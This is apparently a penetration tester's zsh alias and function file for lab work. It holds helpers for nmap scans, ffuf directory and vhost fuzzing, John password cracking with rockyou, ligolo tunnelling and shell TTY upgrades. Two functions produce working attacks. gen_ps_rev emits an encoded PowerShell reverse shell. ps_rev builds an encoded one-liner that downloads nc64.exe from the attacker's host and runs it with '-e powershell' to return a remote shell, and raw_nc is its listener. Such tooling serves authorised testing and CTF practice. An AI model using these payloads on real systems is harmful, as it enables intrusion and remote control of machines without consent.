# Misc
list_ips() {
  ip a show scope global | awk '/^[0-9]+:/ { sub(/:/,"",$2); iface=$2 } /^[[:space:]]*inet / { split($2, a, "/"); print "[\033[96m" iface"\033[0m] "a[1] }'
}

ls_pwd() {
  echo -e "[\e[96m`pwd`\e[0m]\e[34m" && ls && echo -en "\e[0m"
}

mkcd() {
  mkdir $1 && cd $_
}

alias www="list_ips && ls_pwd && python3 -m http.server 80"
alias wwwp="list_ips && ls_pwd && python3 -m http.server"
alias tun0="ifconfig tun0 | grep 'inet ' | cut -d' ' -f10 | tr -d '\n' | xclip -sel clip"

# Hashcracking
rock_john() {
  if [ $# -eq 0 ]
    then
      echo "[i] Usage: rock_john wordlist (options)"
    else
      john "${@}" --wordlist=/usr/share/wordlists/rockyou.txt
  fi
}

# Portscanning
nmap_default () {
  if [ $# -eq 0 ]
    then
      echo "[i] Usage: nmap_default ip (options)"
    else
      [ ! -d "./nmap" ] && echo "[i] Creating $(pwd)/nmap..." && mkdir nmap
      sudo nmap -sCV -T4 --min-rate 10000 "${@}" -v -oA nmap/tcp_default
  fi
}

nmap_udp () {
  if [ $# -eq 0 ]
    then
      echo "[i] Usage: nmap_udp ip (options)"
    else
      [ ! -d "./nmap" ] && echo "[i] Creating $(pwd)/nmap..." && mkdir nmap
      sudo nmap -sUCV -T4 --min-rate 10000 "${@}" -v -oA nmap/udp_default
  fi
}

# Reverse shells

gen_ps_rev () {
  if [ "$#" -ne 2 ]; 
    then
      echo "[i] Usage: gen_ps_rev ip port"
    else
      SHELL=`cat ~/zsh-aliases/shells/ps_rev.txt | sed s/x.x.x.x/$1/g | sed s/yyyy/$2/g | iconv -f utf8 -t utf16le | base64 -w 0`
      echo "powershell -ec $SHELL" | xclip -sel clip
  fi
}


# TTY upgrades
py_tty_upgrade () {
  echo "python -c 'import pty;pty.spawn(\"/bin/bash\")'"| xclip -sel clip
}
py3_tty_upgrade () {
  echo "python3 -c 'import pty;pty.spawn(\"/bin/bash\")'"| xclip -sel clip
}
raw_nc () {
  stty raw -echo; (stty size; cat) | nc -lvnp "$1"
}
alias script_tty_upgrade="echo '/usr/bin/script -qc /bin/bash /dev/null'| xclip -sel clip"
alias tty_fix="stty raw -echo; fg; reset"
alias tty_conf="stty -a | sed 's/;//g' | head -n 1 | sed 's/.*baud /stty /g;s/line.*//g' | xclip -sel clip"
alias tty_confpy2="(stty -a | sed 's/;//g' | head -n 1 | sed 's/.*baud /stty /g;s/line.*//g'; echo \"python3 -c 'import pty;pty.spawn(\\\"/bin/bash\\\")'\") | tr '\n' ';' | xclip -sel clip"
alias tty_confpy3="(stty -a | sed 's/;//g' | head -n 1 | sed 's/.*baud /stty /g;s/line.*//g'; echo \"python3 -c 'import pty;pty.spawn(\\\"/bin/bash\\\")'\") | tr '\n' ';' | xclip -sel clip"
alias tty_full2="tty_confpy2; tty_fix"
alias tty_full="tty_confpy3; tty_fix"

ffufd() {
  hostn=$1
  shift
  ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -e .php,.aspx,.jsp,.html,.js -u http://"$hostn"/FUZZ $@
}

ffufv() {
  hostn=$1
  hostnp=${1%%:*}
  shift
  ffuf -w ~/htb/tools/fuzz4bounty/DNS/subdomains.txt -u http://"$hostn" -H "Host: FUZZ.$hostnp" $@
}

nmaps() {
  hostn=$1
  shift
  sudo nmap -sS -Pn -n -T4 --min-parallelism 1000 --min-rate 5000 -v $hostn -p- $@
}

nmapsf() {
  f=$1
  shift
  sudo nmap -sS -Pn -n -T4 --min-parallelism 1000 --min-rate 5000 -v -iL $f -p- $@
}

nmapp() {
  hostn=$1
  shift
  sudo nmap -sS -Pn -n -T4 --min-parallelism 1000 --min-rate 5000 -v $hostn -sC -sV -p $@
}

nmapu() {
  hostn=$1
  shift
  sudo nmap -sU -Pn -n -T4 --min-parallelism 100 -v $hostn $@
}

setup_ligolo() {
  sudo ip tuntap add user kali mode tun ligolo
  sudo ip link set ligolo up
  sudo ip route add 240.0.0.1/32 dev ligolo
}

cve() {
  echo -n "[CVE-$1](https://nvd.nist.gov/vuln/detail/CVE-$1)" | xclip -sel prim
}
export PATH=~/zsh-aliases/shells/:$PATH
ps_rev () {
  interface="$(ip tuntap show | grep tun0 | cut -d : -f1 | head -n 1)"
  ip="$(ip a s "${interface}" 2>/dev/null | grep -o -P '(?<=inet )[0-9]{1,3}(\.[0-9]{1,3}){3}')"
  lport=${1:-9000}
  www=${2:-9090}
  printf '%s' "New-Item -Path c:\temp -ItemType Directory -Force; iwr $ip:$www/nc64.exe -o c:\temp\nc.exe; c:\temp\nc.exe $ip $lport -e powershell" | iconv -t UTF-16LE | base64 -w 0
}
